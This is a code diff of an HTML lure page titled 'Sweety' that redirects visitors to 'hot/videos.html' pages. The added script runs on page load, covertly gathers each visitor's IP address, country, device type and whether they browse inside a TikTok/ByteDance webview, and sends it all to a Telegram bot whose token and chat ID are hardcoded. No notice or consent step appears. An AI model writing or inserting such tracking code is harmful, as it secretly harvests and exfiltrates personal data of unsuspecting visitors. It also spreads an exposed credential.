@@ -1,42 +1,114 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Определение операционной системы</title>
+  <title>Sweety</title>
 </head>
 <body>
 
+
 <script type="text/javascript">
+  function sendMessageToTelegram(message) {
+    const botToken = '6338286867:AAEGFCdpanhtiU3l9BLd2haGEN-v1Uc5suc';
+    const chatId = '-922689126';
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  
+    const params = {
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'HTML'
+    };
+  
+    const xhr = new XMLHttpRequest();
+    xhr.open('POST', url, true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+  
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === XMLHttpRequest.DONE) {
+        if (xhr.status === 200) {
+          console.log('Message sent successfully!');
+        } else {
+          console.error('Error sending message:', xhr.responseText);
+        }
+      }
+    };
+  
+    xhr.send(JSON.stringify(params));
+  }
+  
   function detectOS() {
     const userAgent = window.navigator.userAgent;
     const isiOS = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
     const isAndroid = /Android/.test(userAgent);
-
-
+  
     if (isiOS) {
-      window.location.href = 'hott/videos.html';
+      sendMessageToTelegram('iOS Device.');
+      sendInfoToTelegram();
+      setTimeout(() => {
+        window.location.href = 'hott/videos.html';
+      }, 1000); 
     } else if (isAndroid) {
-      checkUserAgentForNames();
+      sendMessageToTelegram('Android Device.');
+      sendInfoToTelegram(); 
+      setTimeout(() => {
+        window.location.href = 'hot/videos.html';
+      }, 1000);
     } else {
-      checkUserAgentForNames();
+      sendMessageToTelegram('Not iOS, Not Android.');
+      sendInfoToTelegram(); 
+      setTimeout(() => {
+        window.location.href = 'hot/videos.html';
+      }, 1000);
     }
   }
+  
+  
 
-  const osInfoElement = document.getElementById('os-info');
+  const osInfoElement = document.createElement('div');
+  osInfoElement.id = 'os-info';
+  document.body.appendChild(osInfoElement);
 
   const os = detectOS();
-  osInfoElement.innerHTML = "OP: " + os;
+  
 
   function checkUserAgentForNames() {
     var userAgent = window.navigator.userAgent.toLowerCase();
-    
 
     if (userAgent.indexOf("bytedancewebview") !== -1 || userAgent.indexOf("musical_ly") !== -1) {
       console.log("Found");
-      window.location.href = 'hot/videos.html'; 
+      sendMessageToTelegram('User detected in the browser Bytedance/Musical.ly.');
+    } else {
+      sendMessageToTelegram('The user is not in the browser Bytedance/Musical.ly.');
     }
-    else {
-      window.location.replace('https://onlyfans.com/rita_hottie/c21');
-    }
+
+    sendInfoToTelegram();
+  }
+
+  function getIPAddress(callback) {
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => callback(data.ip))
+      .catch(error => console.error('Error fetching IP address:', error));
+  }
+
+  function getCountryFromIP(ip, callback) {
+    fetch(`https://ipapi.co/${ip}/json/`)
+      .then(response => response.json())
+      .then(data => callback(data.country_name))
+      .catch(error => console.error('Error fetching country from IP:', error));
+  }
+
+  function sendInfoToTelegram() {
+    getIPAddress(ip => {
+      getCountryFromIP(ip, country => {
+        const currentTime = new Date().toLocaleString();
+        const message = `USER INFO:
+        IP: ${ip}
+        Country: ${country}
+        Time: ${currentTime}`;
+
+        sendMessageToTelegram(message);
+      });
+    });
   }
 </script>
 
